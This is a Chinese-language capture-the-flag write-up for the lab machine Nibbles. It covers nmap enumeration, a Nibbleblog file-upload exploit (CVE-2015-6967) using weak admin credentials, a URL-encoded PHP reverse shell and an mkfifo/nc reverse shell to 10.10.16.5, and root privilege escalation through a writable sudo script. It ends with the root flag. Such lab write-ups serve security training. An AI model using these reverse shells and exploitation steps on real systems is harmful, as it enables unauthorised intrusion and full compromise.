kali 10.10.16.5

靶机  10.10.10.75



```bash
└─# nmap -p22,80 -sV -sC -O $ip -oN nmap.txt                               
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-03 08:16 EDT
Nmap scan report for 10.10.10.75 (10.10.10.75)
Host is up (0.59s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (94%), Linux 3.13 (94%), Linux 3.2 - 4.9 (94%), Linux 3.8 - 3.11 (94%), Linux 4.4 (94%), Linux 3.16 (94%), Linux 3.18 (93%), Linux 4.2 (93%), Linux 4.8 (93%), Crestron XPanel control system (93%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



<img src=".\图片\Snipaste_2023-09-04_07-14-37.png" alt="Snipaste_2023-09-04_07-14-37" style="zoom:80%;" />



```bash
└─# searchsploit Nibbleblog                                                                                                                                 130 ⨯
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                          | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                           | php/remote/38489.rb

```

[CVE-2015-6967](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6967)

于是全网找利用脚本

[GitHub - dix0nym/CVE-2015-6967: Nibbleblog 4.0.3 - Arbitrary File Upload (CVE-2015-6967)](https://github.com/dix0nym/CVE-2015-6967)

```bash
└─# python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
```

<img src=".\图片\Snipaste_2023-09-04_07-41-59.png" alt="Snipaste_2023-09-04_07-41-59" style="zoom:80%;" />

看了脚本，本质上是找到后台弱口令登录，再上传webshell



反弹shell，棱角社区里找的 php 反弹shell，url编码了

```
php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.16.5%22%2C1234%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```



提升交互性

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```



```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -al
ls -al
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```



出错了，之前的反弹shell失败了，删除文件最后三行我们修改的内容，连续执行 3 次

```
sed -i '$d' monitor.sh
```



反弹shell

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 4321 > /tmp/f" >> monitor.sh
```





```bash
└─# nc -lvnp 4321                                                                                                                                             1 ⨯
listening on [any] 4321 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.75] 43790
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /home
# cd /root
# ls
root.txt
# cat root.txt
c802ae25e6cd4b5b938b25da747dae96
```


